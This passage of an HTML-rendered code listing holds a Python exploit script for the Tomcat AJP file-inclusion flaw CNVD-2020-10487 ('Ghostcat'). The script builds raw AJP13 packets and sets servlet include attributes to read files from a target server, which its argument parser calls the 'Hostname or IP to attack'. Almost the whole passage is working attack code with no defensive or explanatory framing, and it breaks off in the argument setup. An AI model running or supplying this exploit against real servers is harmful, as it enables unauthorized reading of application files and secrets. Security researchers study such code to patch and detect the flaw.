class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#CNVD-2020-10487  Tomcat-Ajp lfi</span></span><br><span class="line"><span class="comment">#by ydhcui</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Some references:</span></span><br><span class="line"><span class="comment"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_string</span>(<span class="params">s</span>):</span><br><span class="line">	<span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;h&quot;</span>, -<span class="number">1</span>)</span><br><span class="line">	l = <span class="built_in">len</span>(s)</span><br><span class="line">	<span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;H%dsb&quot;</span> % l, l, s.encode(<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpack</span>(<span class="params">stream, fmt</span>):</span><br><span class="line">	size = struct.calcsize(fmt)</span><br><span class="line">	buf = stream.read(size)</span><br><span class="line">	<span class="keyword">return</span> struct.unpack(fmt, buf)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpack_string</span>(<span class="params">stream</span>):</span><br><span class="line">	size, = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> size == -<span class="number">1</span>: <span class="comment"># null string</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">	res, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % size)</span><br><span class="line">	stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotFoundException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpBodyRequest</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="comment"># server == web server, container == servlet</span></span><br><span class="line">	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="built_in">range</span>(<span class="number">2</span>)</span><br><span class="line">	MAX_REQUEST_LENGTH = <span class="number">8186</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_stream, data_len, data_direction=<span class="literal">None</span></span>):</span><br><span class="line">		<span class="variable language_">self</span>.data_stream = data_stream</span><br><span class="line">		<span class="variable language_">self</span>.data_len = data_len</span><br><span class="line">		<span class="variable language_">self</span>.data_direction = data_direction</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">serialize</span>(<span class="params">self</span>):</span><br><span class="line">		data = <span class="variable language_">self</span>.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x00</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			res = struct.pack(<span class="string">&quot;&gt;H&quot;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">			res += data</span><br><span class="line">		<span class="keyword">if</span> <span class="variable language_">self</span>.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">			header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="built_in">len</span>(res))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="built_in">len</span>(res))</span><br><span class="line">		<span class="keyword">return</span> header + res</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">send_and_receive</span>(<span class="params">self, socket, stream</span>):</span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			data = <span class="variable language_">self</span>.serialize()</span><br><span class="line">			socket.send(data)</span><br><span class="line">			r = AjpResponse.receive(stream)</span><br><span class="line">			<span class="keyword">while</span> r.prefix_code != AjpResponse.GET_BODY_CHUNK <span class="keyword">and</span> r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">				r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> r.prefix_code == AjpResponse.SEND_HEADERS <span class="keyword">or</span> <span class="built_in">len</span>(data) == <span class="number">4</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpForwardRequest</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = <span class="built_in">range</span>(<span class="number">28</span>)</span><br><span class="line">	REQUEST_METHODS = &#123;<span class="string">&#x27;GET&#x27;</span>: GET, <span class="string">&#x27;POST&#x27;</span>: POST, <span class="string">&#x27;HEAD&#x27;</span>: HEAD, <span class="string">&#x27;OPTIONS&#x27;</span>: OPTIONS, <span class="string">&#x27;PUT&#x27;</span>: PUT, <span class="string">&#x27;DELETE&#x27;</span>: DELETE, <span class="string">&#x27;TRACE&#x27;</span>: TRACE&#125;</span><br><span class="line">	<span class="comment"># server == web server, container == servlet</span></span><br><span class="line">	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="built_in">range</span>(<span class="number">2</span>)</span><br><span class="line">	COMMON_HEADERS = [<span class="string">&quot;SC_REQ_ACCEPT&quot;</span>,</span><br><span class="line">		<span class="string">&quot;SC_REQ_ACCEPT_CHARSET&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_ENCODING&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_LANGUAGE&quot;</span>, <span class="string">&quot;SC_REQ_AUTHORIZATION&quot;</span>,</span><br><span class="line">		<span class="string">&quot;SC_REQ_CONNECTION&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE2&quot;</span>,</span><br><span class="line">		<span class="string">&quot;SC_REQ_HOST&quot;</span>, <span class="string">&quot;SC_REQ_PRAGMA&quot;</span>, <span class="string">&quot;SC_REQ_REFERER&quot;</span>, <span class="string">&quot;SC_REQ_USER_AGENT&quot;</span></span><br><span class="line">	]</span><br><span class="line">	ATTRIBUTES = [<span class="string">&quot;context&quot;</span>, <span class="string">&quot;servlet_path&quot;</span>, <span class="string">&quot;remote_user&quot;</span>, <span class="string">&quot;auth_type&quot;</span>, <span class="string">&quot;query_string&quot;</span>, <span class="string">&quot;route&quot;</span>, <span class="string">&quot;ssl_cert&quot;</span>, <span class="string">&quot;ssl_cipher&quot;</span>, <span class="string">&quot;ssl_session&quot;</span>, <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;ssl_key_size&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;stored_method&quot;</span>]</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_direction=<span class="literal">None</span></span>):</span><br><span class="line">		<span class="variable language_">self</span>.prefix_code = <span class="number">0x02</span></span><br><span class="line">		<span class="variable language_">self</span>.method = <span class="literal">None</span></span><br><span class="line">		<span class="variable language_">self</span>.protocol = <span class="literal">None</span></span><br><span class="line">		<span class="variable language_">self</span>.req_uri = <span class="literal">None</span></span><br><span class="line">		<span class="variable language_">self</span>.remote_addr = <span class="literal">None</span></span><br><span class="line">		<span class="variable language_">self</span>.remote_host = <span class="literal">None</span></span><br><span class="line">		<span class="variable language_">self</span>.server_name = <span class="literal">None</span></span><br><span class="line">		<span class="variable language_">self</span>.server_port = <span class="literal">None</span></span><br><span class="line">		<span class="variable language_">self</span>.is_ssl = <span class="literal">None</span></span><br><span class="line">		<span class="variable language_">self</span>.num_headers = <span class="literal">None</span></span><br><span class="line">		<span class="variable language_">self</span>.request_headers = <span class="literal">None</span></span><br><span class="line">		<span class="variable language_">self</span>.attributes = <span class="literal">None</span></span><br><span class="line">		<span class="variable language_">self</span>.data_direction = data_direction</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">pack_headers</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="variable language_">self</span>.num_headers = <span class="built_in">len</span>(<span class="variable language_">self</span>.request_headers)</span><br><span class="line">		res = <span class="string">&quot;&quot;</span></span><br><span class="line">		res = struct.pack(<span class="string">&quot;&gt;h&quot;</span>, <span class="variable language_">self</span>.num_headers)</span><br><span class="line">		<span class="keyword">for</span> h_name <span class="keyword">in</span> <span class="variable language_">self</span>.request_headers:</span><br><span class="line">			<span class="keyword">if</span> h_name.startswith(<span class="string">&quot;SC_REQ&quot;</span>):</span><br><span class="line">				code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + <span class="number">1</span></span><br><span class="line">				res += struct.pack(<span class="string">&quot;BB&quot;</span>, <span class="number">0xA0</span>, code)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">			res += pack_string(<span class="variable language_">self</span>.request_headers[h_name])</span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">pack_attributes</span>(<span class="params">self</span>):</span><br><span class="line">		res = <span class="string">b&quot;&quot;</span></span><br><span class="line">		<span class="keyword">for</span> attr <span class="keyword">in</span> <span class="variable language_">self</span>.attributes:</span><br><span class="line">			a_name = attr[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">			code = AjpForwardRequest.ATTRIBUTES.index(a_name) + <span class="number">1</span></span><br><span class="line">			res += struct.pack(<span class="string">&quot;b&quot;</span>, code)</span><br><span class="line">			<span class="keyword">if</span> a_name == <span class="string">&quot;req_attribute&quot;</span>:</span><br><span class="line">				aa_name, a_value = attr[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">				res += pack_string(aa_name)</span><br><span class="line">				res += pack_string(a_value)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				res += pack_string(attr[<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">		res += struct.pack(<span class="string">&quot;B&quot;</span>, <span class="number">0xFF</span>)</span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">serialize</span>(<span class="params">self</span>):</span><br><span class="line">		res = <span class="string">&quot;&quot;</span></span><br><span class="line">		res = struct.pack(<span class="string">&quot;bb&quot;</span>, <span class="variable language_">self</span>.prefix_code, <span class="variable language_">self</span>.method)</span><br><span class="line">		res += pack_string(<span class="variable language_">self</span>.protocol)</span><br><span class="line">		res += pack_string(<span class="variable language_">self</span>.req_uri)</span><br><span class="line">		res += pack_string(<span class="variable language_">self</span>.remote_addr)</span><br><span class="line">		res += pack_string(<span class="variable language_">self</span>.remote_host)</span><br><span class="line">		res += pack_string(<span class="variable language_">self</span>.server_name)</span><br><span class="line">		res += struct.pack(<span class="string">&quot;&gt;h&quot;</span>, <span class="variable language_">self</span>.server_port)</span><br><span class="line">		res += struct.pack(<span class="string">&quot;?&quot;</span>, <span class="variable language_">self</span>.is_ssl)</span><br><span class="line">		res += <span class="variable language_">self</span>.pack_headers()</span><br><span class="line">		res += <span class="variable language_">self</span>.pack_attributes()</span><br><span class="line">		<span class="keyword">if</span> <span class="variable language_">self</span>.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">			header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="built_in">len</span>(res))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="built_in">len</span>(res))</span><br><span class="line">		<span class="keyword">return</span> header + res</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, raw_packet</span>):</span><br><span class="line">		stream = StringIO(raw_packet)</span><br><span class="line">		<span class="variable language_">self</span>.magic1, <span class="variable language_">self</span>.magic2, data_len = unpack(stream, <span class="string">&quot;bbH&quot;</span>)</span><br><span class="line">		<span class="variable language_">self</span>.prefix_code, <span class="variable language_">self</span>.method = unpack(stream, <span class="string">&quot;bb&quot;</span>)</span><br><span class="line">		<span class="variable language_">self</span>.protocol = unpack_string(stream)</span><br><span class="line">		<span class="variable language_">self</span>.req_uri = unpack_string(stream)</span><br><span class="line">		<span class="variable language_">self</span>.remote_addr = unpack_string(stream)</span><br><span class="line">		<span class="variable language_">self</span>.remote_host = unpack_string(stream)</span><br><span class="line">		<span class="variable language_">self</span>.server_name = unpack_string(stream)</span><br><span class="line">		<span class="variable language_">self</span>.server_port = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line">		<span class="variable language_">self</span>.is_ssl = unpack(stream, <span class="string">&quot;?&quot;</span>)</span><br><span class="line">		<span class="variable language_">self</span>.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">		<span class="variable language_">self</span>.request_headers = &#123;&#125;</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.num_headers):</span><br><span class="line">			code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> code &gt; <span class="number">0xA000</span>:</span><br><span class="line">				h_name = AjpForwardRequest.COMMON_HEADERS[code - <span class="number">0xA001</span>]</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				h_name = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">				stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">			h_value = unpack_string(stream)</span><br><span class="line">			<span class="variable language_">self</span>.request_headers[h_name] = h_value</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">send_and_receive</span>(<span class="params">self, socket, stream, save_cookies=<span class="literal">False</span></span>):</span><br><span class="line">		res = []</span><br><span class="line">		i = socket.sendall(<span class="variable language_">self</span>.serialize())</span><br><span class="line">		<span class="keyword">if</span> <span class="variable language_">self</span>.method == AjpForwardRequest.POST:</span><br><span class="line">			<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">		r = AjpResponse.receive(stream)</span><br><span class="line">		<span class="keyword">assert</span> r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">		res.append(r)</span><br><span class="line">		<span class="keyword">if</span> save_cookies <span class="keyword">and</span> <span class="string">&#x27;Set-Cookie&#x27;</span> <span class="keyword">in</span> r.response_headers:</span><br><span class="line">			<span class="variable language_">self</span>.headers[<span class="string">&#x27;SC_REQ_COOKIE&#x27;</span>] = r.response_headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line">		<span class="comment"># read body chunks and end response packets</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			r = AjpResponse.receive(stream)</span><br><span class="line">			res.append(r)</span><br><span class="line">			<span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">elif</span> r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">raise</span> NotImplementedError</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpResponse</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = <span class="built_in">range</span>(<span class="number">7</span>)</span><br><span class="line">	COMMON_SEND_HEADERS = [</span><br><span class="line">			<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Content-Language&quot;</span>, <span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;Date&quot;</span>, <span class="string">&quot;Last-Modified&quot;</span>,</span><br><span class="line">			<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;Set-Cookie2&quot;</span>, <span class="string">&quot;Servlet-Engine&quot;</span>, <span class="string">&quot;Status&quot;</span>, <span class="string">&quot;WWW-Authenticate&quot;</span></span><br><span class="line">			]</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, stream</span>):</span><br><span class="line">		<span class="comment"># read headers</span></span><br><span class="line">		<span class="variable language_">self</span>.magic, <span class="variable language_">self</span>.data_length, <span class="variable language_">self</span>.prefix_code = unpack(stream, <span class="string">&quot;&gt;HHb&quot;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="variable language_">self</span>.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">			<span class="variable language_">self</span>.parse_send_headers(stream)</span><br><span class="line">		<span class="keyword">elif</span> <span class="variable language_">self</span>.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">			<span class="variable language_">self</span>.parse_send_body_chunk(stream)</span><br><span class="line">		<span class="keyword">elif</span> <span class="variable language_">self</span>.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">			<span class="variable language_">self</span>.parse_end_response(stream)</span><br><span class="line">		<span class="keyword">elif</span> <span class="variable language_">self</span>.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">			<span class="variable language_">self</span>.parse_get_body_chunk(stream)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse_send_headers</span>(<span class="params">self, stream</span>):</span><br><span class="line">		<span class="variable language_">self</span>.http_status_code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">		<span class="variable language_">self</span>.http_status_msg = unpack_string(stream)</span><br><span class="line">		<span class="variable language_">self</span>.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">		<span class="variable language_">self</span>.response_headers = &#123;&#125;</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.num_headers):</span><br><span class="line">			code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> code &lt;= <span class="number">0xA000</span>: <span class="comment"># custom header</span></span><br><span class="line">				h_name, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">				stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">				h_value = unpack_string(stream)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				h_name = AjpResponse.COMMON_SEND_HEADERS[code-<span class="number">0xA001</span>]</span><br><span class="line">				h_value = unpack_string(stream)</span><br><span class="line">			<span class="variable language_">self</span>.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse_send_body_chunk</span>(<span class="params">self, stream</span>):</span><br><span class="line">		<span class="variable language_">self</span>.data_length, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">		<span class="variable language_">self</span>.data = stream.read(<span class="variable language_">self</span>.data_length+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse_end_response</span>(<span class="params">self, stream</span>):</span><br><span class="line">		<span class="variable language_">self</span>.reuse, = unpack(stream, <span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse_get_body_chunk</span>(<span class="params">self, stream</span>):</span><br><span class="line">		rlen, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> rlen</span><br><span class="line"></span><br><span class="line"><span class="meta">	@staticmethod</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">receive</span>(<span class="params">stream</span>):</span><br><span class="line">		r = AjpResponse()</span><br><span class="line">		r.parse(stream)</span><br><span class="line">		<span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_ajp_forward_request</span>(<span class="params">target_host, req_uri, method=AjpForwardRequest.GET</span>):</span><br><span class="line">	fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">	fr.method = method</span><br><span class="line">	fr.protocol = <span class="string">&quot;HTTP/1.1&quot;</span></span><br><span class="line">	fr.req_uri = req_uri</span><br><span class="line">	fr.remote_addr = target_host</span><br><span class="line">	fr.remote_host = <span class="literal">None</span></span><br><span class="line">	fr.server_name = target_host</span><br><span class="line">	fr.server_port = <span class="number">80</span></span><br><span class="line">	fr.request_headers = &#123;</span><br><span class="line">		<span class="string">&#x27;SC_REQ_ACCEPT&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_CONNECTION&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_CONTENT_LENGTH&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_HOST&#x27;</span>: target_host,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_USER_AGENT&#x27;</span>: <span class="string">&#x27;Mozilla&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, sdch&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span></span><br><span class="line">	&#125;</span><br><span class="line">	fr.is_ssl = <span class="literal">False</span></span><br><span class="line">	fr.attributes = []</span><br><span class="line">	<span class="keyword">return</span> fr</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tomcat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_host, target_port</span>):</span><br><span class="line">		<span class="variable language_">self</span>.target_host = target_host</span><br><span class="line">		<span class="variable language_">self</span>.target_port = target_port</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">self</span>.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		<span class="variable language_">self</span>.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">		<span class="variable language_">self</span>.socket.connect((target_host, target_port))</span><br><span class="line">		<span class="variable language_">self</span>.stream = <span class="variable language_">self</span>.socket.makefile(<span class="string">&quot;rb&quot;</span>, buffering=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">perform_request</span>(<span class="params">self, req_uri, headers=&#123;&#125;, method=<span class="string">&#x27;GET&#x27;</span>, user=<span class="literal">None</span>, password=<span class="literal">None</span>, attributes=[]</span>):</span><br><span class="line">		<span class="variable language_">self</span>.req_uri = req_uri</span><br><span class="line">		<span class="variable language_">self</span>.forward_request = prepare_ajp_forward_request(<span class="variable language_">self</span>.target_host, <span class="variable language_">self</span>.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> % (<span class="variable language_">self</span>.target_host, <span class="variable language_">self</span>.target_port, req_uri))</span><br><span class="line">		<span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> password <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">			<span class="variable language_">self</span>.forward_request.request_headers[<span class="string">&#x27;SC_REQ_AUTHORIZATION&#x27;</span>] = <span class="string">&quot;Basic &quot;</span> + (<span class="string">&quot;%s:%s&quot;</span> % (user, password)).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		<span class="keyword">for</span> h <span class="keyword">in</span> headers:</span><br><span class="line">			<span class="variable language_">self</span>.forward_request.request_headers[h] = headers[h]</span><br><span class="line">		<span class="keyword">for</span> a <span class="keyword">in</span> attributes:</span><br><span class="line">			<span class="variable language_">self</span>.forward_request.attributes.append(a)</span><br><span class="line">		responses = <span class="variable language_">self</span>.forward_request.send_and_receive(<span class="variable language_">self</span>.socket, <span class="variable language_">self</span>.stream)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(responses) == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">		snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line">		data_res = responses[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(data_res) == <span class="number">0</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;No data in response. Headers:%s\n&quot;</span> % snd_hdrs_res.response_headers)</span><br><span class="line">		<span class="keyword">return</span> snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">javax.servlet.include.request_uri</span></span><br><span class="line"><span class="string">javax.servlet.include.path_info</span></span><br><span class="line"><span class="string">javax.servlet.include.servlet_path</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;target&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Hostname or IP to attack&quot;</span>)</span><br><span class="line">parser.add_argument(<span 